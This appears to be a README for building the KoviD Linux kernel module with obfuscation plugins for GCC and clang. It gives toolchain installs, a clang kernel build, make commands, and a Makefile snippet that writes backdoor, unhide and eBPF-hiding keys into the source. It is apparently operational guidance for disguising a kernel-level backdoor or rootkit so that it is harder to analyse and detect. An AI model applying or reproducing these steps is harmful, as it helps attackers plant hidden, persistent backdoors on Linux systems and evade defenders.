# Obfuscate KoviD

Perform obfuscation of the KoviD LKM.

## Build Obfustaion Plugin

First of all, lets build plugins for both GCC and clang compilers.
Please follow this: https://github.com/djolertrk/kovid-obfustaion-passes/blob/main/README.md#build.
Make sure you install dependencies such as:

```
$ sudo apt-get install gcc-12-plugin-dev
```

Bellow are two scenarios on how to build with obfustaion, by using:
1. gcc
2. clang

## Build with `gcc`

These are the steps to build with `gcc` compiler.

Build KoviD:

```
$ make PROCNAME="myprocname" OBFUSCATE=1
```

## Build with `clang` (EXPERIMENTAL)

These are the steps to build with LLVM/Clang compiler.

### Install `clang`

```
echo "deb http://apt.llvm.org/$(lsb_release -cs)/ llvm-toolchain-$(lsb_release -cs)-19 main" | sudo tee /etc/apt/sources.list.d/llvm.list
wget -O - https://apt.llvm.org/llvm-snapshot.gpg.key | sudo apt-key add -
sudo apt-get update
sudo apt-get install -y llvm-19-dev clang-19 libclang-19-dev lld-19 pkg-config libgc-dev libssl-dev zlib1g-dev libcjson-dev libunwind-dev
```

### Build Linux with `clang`

First, we need to build kernel with `clang` compiler.

Download kernel:
```
wget https://cdn.kernel.org/pub/linux/kernel/v6.x/linux-6.8.tar.xz
tar -xf linux-6.8.tar.xz
```

Configure it:

```
$ make defconfig
echo "CONFIG_CC_IS_CLANG=y" >> .config
```
Make sure that those are set correctly:

```
CONFIG_FUNCTION_TRACER=y
CONFIG_DYNAMIC_FTRACE=y
CONFIG_FTRACE_SYSCALLS=y
CONFIG_HAVE_DYNAMIC_FTRACE_WITH_REGS=y
CONFIG_HAVE_FENTRY=y
```

Build it:

```
$ cd linux-6.8
$ export PATH=/usr/lib/llvm-19/bin/:$PATH
$ make LLVM=1 LLVM_IAS=1 -j4 CC=clang-19 CXX=clang++-19 KCFLAGS="-Wno-error"
$ sudo make LLVM=1 LLVM_IAS=1 -j4 CC=clang-19 CXX=clang++-19 KCFLAGS="-Wno-error" modules_install
```

### Build KoviD with `clang` + obfuscation plugin

```

$ export PATH=/usr/lib/llvm-19/bin/:$PATH
$ make PROCNAME="myprocname" OBFUSCATE_WITH_CLANG=1 CC=clang-19 CXX=clang++-19 LLVM=1 LLVM_IAS=1
```

### TODO

Obfuscation with `clang` does not work end to end, since linux+clang build is not mature enough. So, we remove that for now.

Basically, in `Makefile` we should just add:

```
ifdef OBFUSCATE_WITH_CLANG
CC=clang-19
COMPILER_OPTIONS := ${COMPILER_OPTIONS} \
	-fplugin="/usr/local/lib/libKoviDRenameCodeLLVMPlugin.so"
endif
...
all:
ifndef OBFUSCATE_WITH_CLANG
	$(if $(PROCNAME),,$(error ERROR: PROCNAME is not defined. Please invoke make with PROCNAME="your_process_name"))
	@sed -i "s/\(uint64_t auto_bdkey = \)[^;]*;/\1$(BDKEY);/" src/sock.c
	@sed -i "s/\(uint64_t auto_unhidekey = \)[^;]*;/\1$(UNHIDEKEY);/" src/kovid.c
	@sed -i "s/\(uint64_t auto_ebpfhidenkey = \)[^;]*;/\1$(EBPFHIDEKEY);/" tools/ebpf/main.c
	make -C /lib/modules/6.8.0/build M=$(PWD) CC=clang-19 \
        CONFIG_CC_IS_CLANG=1 \
        KBUILD_CFLAGS="-O2 -Qunused-arguments -fno-integrated-as -Wno-error -fplugin=\"/usr/local/lib/KoviDRenameCodePlugin.so\"" \
        KBUILD_CFLAGS_EXTRA="-fno-integrated-as -fgnu89-inline -Wno-error=asm -fsanitize=bounds" \
        modules
else
...
```
